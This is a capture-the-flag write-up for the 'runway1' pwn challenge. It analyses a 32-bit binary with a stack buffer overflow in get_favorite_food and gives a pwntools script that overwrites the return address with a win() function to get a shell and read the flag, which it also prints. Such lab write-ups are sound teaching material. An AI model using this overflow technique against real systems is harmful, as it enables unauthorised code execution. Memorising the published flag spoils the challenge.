https://ctftime.org/event/2449

# runway1 (pwn)

Starting to ramp up!

nc challs.pwnoh.io 13401

## Analysis

We can see that the binary lacks PIE and stack canaries:

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

We can see that the following function allows us to overwrite the return address on the stack:

```C
int get_favorite_food() {
    char food[64];

    printf("What is your favorite food?\n");
    fflush(stdout);

    fgets(food, 100, stdin);

    printf("Hmmm..... %s...", food);
}
```

We can see that the binary contains a `win` function that we would like to transfer control to:

```C
int win() {
    printf("You win! Here is your shell:\n");

    system("/bin/sh");
}
```

## Solution

1) Overflow the buffer on the stack - taking care to note that we need 76 or 0x4c bytes to reach the return address not 64 bytes as appears in the source code
2) Write the address of the `win` function over the return address

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./runway1", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("challs.pwnoh.io", 13401)

payload = b""
payload += b"A" * 0x4c
payload += p64(elf.sym["win"])

p.sendlineafter(b"food?\n", payload)

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}
```

## Flag
`bctf{I_34t_fl4GS_4_bR34kf4st_7c639e33ffcfe8c2}`

smiley 2024/09/29
